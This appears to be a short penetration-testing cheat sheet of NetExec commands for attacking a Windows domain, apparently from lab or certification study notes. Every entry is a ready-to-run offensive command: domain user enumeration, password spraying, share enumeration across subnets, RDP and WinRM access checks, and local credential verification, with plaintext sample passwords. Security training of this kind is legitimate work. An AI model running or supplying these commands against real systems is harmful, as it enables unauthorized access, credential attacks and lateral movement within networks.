---
description: Various Net Exec commands for every scenario
---

# NXC - Net Exec

#### Find Domain Users (domain creds)

```shellscript
nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > users.txt
```

#### Password Spray&#x20;

```shellscript
nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
```

#### Share Enumeration (domain creds)

```shellscript
nxc smb 192.168.242.0/24 -u stephanie -p 'LegmanTeamBenzoin!!' --shares
```

#### Check for RDP Access Across a Subnet (domain creds)

```shellscript
nxc rdp 192.168.163.0/24 -u mike -p 'Darkness1099!' -d corp.com
```

#### Verify local user credentials over SMB

```shellscript
nxc smb 192.168.201.96 -u apache -p 'New2Era4.!' --local-auth
```

#### List shares using a local user on a specific machine

```shellscript
nxc smb 192.168.201.96 -u apache -p 'New2Era4.!' --local-auth --shares
```

#### Verify if WinRM can be utilized with local creds

```shellscript
nxc winrm 192.168.201.96 -u apache -p 'New2Era4.!'
```
